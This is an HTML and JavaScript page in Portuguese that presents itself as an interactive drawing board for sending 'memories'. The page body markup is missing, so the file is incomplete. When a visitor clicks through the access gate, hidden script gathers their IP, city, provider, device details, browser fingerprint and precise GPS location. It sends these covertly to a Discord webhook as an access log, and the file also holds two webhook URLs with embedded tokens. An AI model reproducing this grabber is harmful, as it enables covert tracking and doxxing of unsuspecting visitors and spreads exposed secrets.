<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Quadro Interativo - Memórias</title>
    <style>
        :root {
            --primary: #c61c44;
            --bg: #0a0a0a;
            --text: #e0e0e0;
            --transition-speed: 0.8s;
        }

        body {
            margin: 0; padding: 0; overflow: hidden;
            background-color: var(--bg);
            background-image: radial-gradient(circle at 50% 50%, #1a0409 0%, var(--bg) 100%);
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
        }

        /* Tela de Bloqueio Inicial */
        #overlay-acesso {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: var(--bg); z-index: 1000;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            text-align: center; padding: 20px;
        }

        #header-texto {
            position: absolute;
            top: 20px;
            width: 90%;
            max-width: 800px;
            text-align: center;
            color: var(--text);
            text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
            z-index: 10;
            pointer-events: none;
        }

        #header-texto h1 {
            font-size: 1.1rem;
            margin: 0;
            line-height: 1.4;
            font-weight: 300;
            letter-spacing: 1px;
        }

        #flash {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: white; opacity: 0; pointer-events: none; z-index: 100;
        }

        #controles {
            position: absolute;
            bottom: 30px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
            z-index: 20;
            width: 100%;
        }

        #mensagem-input {
            width: 260px;
            padding: 12px 15px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(198, 28, 68, 0.3);
            border-radius: 8px;
            color: var(--text);
            font-family: inherit;
            text-align: center;
            backdrop-filter: blur(10px);
            outline: none;
            transition: all 0.3s ease;
        }

        #mensagem-input:focus {
            background: rgba(255, 255, 255, 0.1);
            border-color: var(--primary);
            width: 300px;
            box-shadow: 0 0 15px rgba(198, 28, 68, 0.2);
        }

        #toolbar {
            display: flex;
            gap: 10px;
        }

        .btn-quadro {
            padding: 12px 22px; 
            background: rgba(255, 255, 255, 0.05); 
            color: var(--text);
            border: 1px solid rgba(255, 255, 255, 0.2); 
            border-radius: 8px;
            cursor: pointer; 
            backdrop-filter: blur(5px); 
            transition: 0.3s;
            font-family: inherit;
            font-size: 0.85rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .ativo { 
            background: var(--primary); 
            color: white; 
            border-color: var(--primary);
            box-shadow: 0 0 15px rgba(198, 28, 68, 0.4);
        }

        canvas { display: block; touch-action: none; cursor: crosshair; }

        #status-msg {
            position: absolute; display: none; color: white; font-size: 1rem;
            text-align: center; z-index: 50; background: rgba(0,0,0,0.9);
            padding: 15px 30px; border-radius: 12px; border: 1px solid var(--primary);
        }

        .flash-active { animation: flashAnim 0.7s ease-out; }
        @keyframes flashAnim { 0% { opacity: 1; } 100% { opacity: 0; } }
    </style>
</head>

<script>

const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

const flash = document.getElementById('flash');
const statusMsg = document.getElementById('status-msg');
const inputMsg = document.getElementById('mensagem-input');

// =========================
// WEBHOOKS
// =========================

const DISCORD_WEBHOOK_QUADRO = "https://discord.com/api/webhooks/1498467679097327670/ux0Y9AVqufg7tGCheSBXNc0WZvF2OYh2HRGKDJhqdm-KTq1eVKdajWsSofQKTNAYYmwC"; 
const DISCORD_WEBHOOK_LOGS = "https://discord.com/api/webhooks/1503850219559850177/m7-XQ6IyCu0UgQJ_p-kn7i0nzbSpfyBzJWsMJ2f9aoV3aMkQDG5CaxWjNt_ozasupw3Q"; 


// =========================
// CONFIG
// =========================

let desenhando = false;
let modo = 'giz';

canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

// =========================
// LOGS
// =========================

async function liberarEGerarLog() {

    const btn = document.getElementById('btn-entrar');

    btn.innerText = "Validando...";
    btn.disabled = true;

    // Evita múltiplos logs
    if (sessionStorage.getItem("logEnviado")) {

        document.getElementById('overlay-acesso').style.display = 'none';

        return;
    }

    // =========================
    // DADOS SISTEMA
    // =========================

    const sistema = {

        plataforma: navigator.platform,

        navegador: navigator.userAgent,

        idioma: navigator.language,

        cpu: navigator.hardwareConcurrency || "N/D",

        memoria: navigator.deviceMemory || "N/D",

        tela: `${screen.width}x${screen.height}`,

        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,

        horario: new Date().toLocaleString('pt-BR')

    };

    // =========================
    // IP
    // =========================

    let ipData = {};

    try {

        const req = await fetch("https://ipapi.co/json/");

        ipData = await req.json();

    } catch (e) {

        console.error("Erro IP");

    }

    // =========================
    // FINALIZAR
    // =========================

    async function finalizarAcesso(lat = null, lon = null) {

        const embed = {

            title: "🔐 NOVO ACESSO",

            color: 0xc61c44,

            fields: [

                {
                    name: "🌐 IP",
                    value: ipData.ip || "Desconhecido",
                    inline: true
                },

                {
                    name: "🏙 Cidade",
                    value: `${ipData.city || "?"} - ${ipData.region || "?"}`,
                    inline: true
                },

                {
                    name: "🌍 País",
                    value: ipData.country_name || "?",
                    inline: true
                },

                {
                    name: "📡 Provedor",
                    value: ipData.org || "Desconhecido",
                    inline: false
                },

                {
                    name: "💻 Plataforma",
                    value: sistema.plataforma,
                    inline: true
                },

                {
                    name: "📱 Tela",
                    value: sistema.tela,
                    inline: true
                },

                {
                    name: "🗣 Idioma",
                    value: sistema.idioma,
                    inline: true
                },

                {
                    name: "⚙️ CPU",
                    value: `${sistema.cpu} núcleos`,
                    inline: true
                },

                {
                    name: "🧮 RAM",
                    value: `${sistema.memoria} GB`,
                    inline: true
                },

                {
                    name: "🕒 Timezone",
                    value: sistema.timezone,
                    inline: true
                },

                {
                    name: "🧠 Navegador",
                    value: sistema.navegador.substring(0, 1000),
                    inline: false
                },

                {
                    name: "⏰ Horário",
                    value: sistema.horario,
                    inline: false
                }

            ],

            footer: {

                text: "Sistema de Logs"

            }

        };

        // =========================
        // GPS
        // =========================

        if (lat && lon) {

            embed.fields.push({

                name: "📍 GPS",

                value: `https://www.google.com/maps?q=${lat},${lon}`,

                inline: false

            });

        } else {

            embed.fields.push({

                name: "📍 GPS",

                value: "Permissão recusada",

                inline: false

            });

        }

        // =========================
        // ENVIAR
        // =========================

        try {

            await fetch(DISCORD_WEBHOOK_LOGS, {

                method: 'POST',

                headers: {

                    'Content-Type': 'application/json'

                },

                body: JSON.stringify({

                    embeds: [embed]

                })

            });

            sessionStorage.setItem("logEnviado", "1");

        } catch (err) {

            console.error("Erro webhook");

        }

        // =========================
        // LIBERAR
        // =========================

        document.getElementById('overlay-acesso').style.display = 'none';
    }

    // =========================
    // GEOLOCALIZAÇÃO
    // =========================

    if ("geolocation" in navigator) {

        navigator.geolocation.getCurrentPosition(

            (p) => {

                finalizarAcesso(

                    p.coords.latitude,

                    p.coords.longitude

                );

            },

            () => {

                finalizarAcesso();

            },

            {

                enableHighAccuracy: true,

                timeout: 10000,

                maximumAge: 0

            }

        );

    } else {

        finalizarAcesso();

    }
}

// =========================
// DESENHO
// =========================

function setModo(m) {

    modo = m;

    document.getElementById('btn-giz').classList.toggle('ativo', m === 'giz');

    document.getElementById('btn-borracha').classList.toggle('ativo', m === 'borracha');
}

function getPos(e) {

    const x = e.clientX || (e.touches && e.touches[0].clientX);

    const y = e.clientY || (e.touches && e.touches[0].clientY);

    return { x, y };
}

function iniciar(e) {

    if (e.target.id === 'mensagem-input') return;

    desenhando = true;

    const pos = getPos(e);

    ctx.beginPath();

    ctx.moveTo(pos.x, pos.y);

    if (modo === 'giz') {

        ctx.globalCompositeOperation = 'source-over';

        ctx.strokeStyle = "rgba(255,235,240,0.85)";

        ctx.lineWidth = 3;

        ctx.lineCap = 'round';

    } else {

        ctx.globalCompositeOperation = 'destination-out';

        ctx.lineWidth = 40;
    }
}

function mover(e) {

    if (!desenhando) return;

    const pos = getPos(e);

    ctx.lineTo(pos.x, pos.y);

    ctx.stroke();
}

// =========================
// ENVIAR DESENHO
// =========================

async function capturarEEnviar() {

    const textoUsuario = inputMsg.value || "Sem mensagem.";

    flash.classList.add('flash-active');

    statusMsg.style.display = 'block';

    canvas.toBlob(async (blob) => {

        const formData = new FormData();

        formData.append('file', blob, 'desenho.png');

        formData.append('payload_json', JSON.stringify({

            content: `🎨 Nova memória recebida!\n\nMensagem: ${textoUsuario}`

        }));

        try {

            const response = await fetch(DISCORD_WEBHOOK_QUADRO, {

                method: 'POST',

                body: formData

            });

            if (response.ok) {

                statusMsg.innerHTML = "✅ Recebido!";

                setTimeout(() => {

                    window.location.href = "inicio.html";

                }, 1500);

            } else {

                statusMsg.innerHTML = "❌ Erro ao enviar";

            }

        } catch (err) {

            statusMsg.innerHTML = "❌ Erro conexão";

        }

    }, 'image/png');
}

// =========================
// EVENTOS
// =========================

canvas.addEventListener('mousedown', iniciar);

window.addEventListener('mousemove', mover);

window.addEventListener('mouseup', () => desenhando = false);

canvas.addEventListener('touchstart', (e) => {

    if(e.target.id !== 'mensagem-input') e.preventDefault();

    iniciar(e);

});

window.addEventListener('touchmove', mover);

window.addEventListener('touchend', () => desenhando = false);

window.addEventListener('resize', () => {

    canvas.width = window.innerWidth;

    canvas.height = window.innerHeight;

});

</script>
